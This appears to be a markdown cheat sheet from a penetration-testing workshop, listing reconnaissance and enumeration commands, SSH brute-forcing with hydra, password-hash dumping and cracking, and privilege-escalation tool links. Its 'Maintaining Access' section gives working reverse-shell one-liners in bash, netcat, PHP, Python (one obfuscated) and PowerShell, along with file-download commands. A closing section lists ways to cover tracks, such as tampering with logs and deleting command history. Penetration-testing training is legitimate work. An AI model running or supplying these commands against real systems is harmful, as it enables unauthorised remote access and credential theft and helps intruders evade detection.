# Penetration Testing Workshop Cheat Sheet
PS: These are mainly things which I've tried, not everything out there :D

## Reconnaissance & Enumeration

### OSINT tools

```
whois <domain>
```
```
recon-ng
```
```
maltego
```
```
Shodan
```

### NetDiscover
```
netdiscover -r 192.168.1.0/24 -i tun0
```

### Nmap

* **Some basic options**
```
nmap [options] <target>
```
```
-sn					ping scan, disable port scan
-sV					Service version detection
-sU					UDP scan
-p X,Y,..			Ports to scan, -p- for all 65535 ports
-O					OS detection
-A					All of the above
-v					Verbose mode
--max_retries X		Max number of probes per port
--script			Use nmap scripts, to find installed scripts: "locate nse | grep script"
-S <ip>				Spoofing ip address
```


* *Example 1* : Scan Live Machines On Network With OS Detection
```
nmap -sn -O 192.168.1.0/24
```
* *Example 2* : Heartbleed Vulnerability Detetion
```
nmap -sV -p443 --script=ssl-heartbleed 192.168.1.10
```
* *Example 3* : Geolocation Traceroute
```
nmap -p80 --traceroute --script traceroute-geolocation.nse  192.168.1.10
```

### **Enumerating each service**

### HTTP

* **Nikto: automated scanner**
```
nikto -h http://192.168.1.10
```
* **Trying all methods with cURL**
```
curl -vX OPTIONS 192.168.1.10
```
* **Directory discovery**
```
dirb http://192.168.1.10 ./wordlist.txt
```
```
gobuster -u http://192.168.1.10 -w ./wordlist.txt
```

### SMB

```
enum4linux -a 192.168.1.10
```

* **Shares and version enumeration**
```
smbclient -L //Domain
```

* **Users enumeration**
```
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.1.10
```

* **Mount a share locally**
```
mount 192.168.1.10:/vol/share /mnt/nfs
```

### Finger

* **Logged-in Users**
```
finger @192.168.1.10
```

* **Specific user details**
```
finger root@192.168.1.10
```


## Gainning Access

Use Exploit-DB, searchsploit, .. to find known CVEs as they're most likely to be encoutered, or keep on going manually :D
```
searchsploit joomla
```

### WEB

* **XSS**

* **LFI/RFI**

* **RCE**

* **File upload**

* **CSRF**

* **SQLi**

* **LDAP**

### SSH

* **Bruteforce login using wordlists**
```
hydra -L ./users.txt -P ./passwords.txt 192.168.1.10 -t 10 ssh
```

### Crack password hashs

**Kerberos tickets**
```
hashcat64 -a 0 -m 13100 ./spn.kirbi /usr/share/wordlists/rockyou.txt
```

**Linux password hashs**

getting the hashes

```
unshadow /etc/passwd /etc/shadow > passwords.txt
```
cracking
```
john --wordlist=./rockyou.txt ./passwords.txt
```
```
hashcat -m 500 -a 0 -o cracked.txt ./hashes.txt ./rockyou.txt
```

**Windows password hashs**

getting the hashes

```
cd C:/WINDOWS/system32/config
bkhive system ./hive.txt
samdump2 SAM ./hive.txt > hashes.txt
```
cracking
```
john /root/hash.txt -format=nt2
```
```
hashcat -m 1000 -a 0 -o cracked.txt ./hashes.txt ./rockyou.txt
```


## Privilege Escalation

### Local Enumeration

**Linux enumeration**

* https://github.com/rebootuser/LinEnum

**Linux exploit suggester**

* https://github.com/mzet-/linux-exploit-suggester

**Windows enumeration**

* https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

**Windows privesc checker**

* https://github.com/pentestmonkey/windows-privesc-check

## Maintaining Access

### Reverse shells
**bash**
```
bash -i >& /dev/tcp/192.168.1.10/1234 0>&1
```
**netcat**
```
nc 192.168.1.10 1234 -e /bin/sh

nc.exe 192.168.1.10 1234 -e cmd.exe
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
**telnet**
```
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.10 1234 0/tmp/p
```
**php**
```
php -r '$sock=fsockopen("192.168.1.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**python**
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

windows only:
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('192.168.1.10', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
**powershell**
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**download files into windows**
```
certutil.exe -urlcache -split -f http://192.168.1.10/file.txt file.txt

powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.10/file.txt', 'C:\Users\PC\Desktop\file.txt')
```
**web shells in kali**
```
/usr/share/webshells
```




## Covering Tracks

**Hide connections**
*	Tamper or spoof backdoor source
*	Establish VPN connection

**Deleting Evidence**
*	delete cache
*	delete commands history
*	output to standard output

**Log Tampering**
*	Windows:  event viewer
*	Linux:	 /var/log/

**Hiding files**
*	Steganography
*	Forensics
*	Trojans
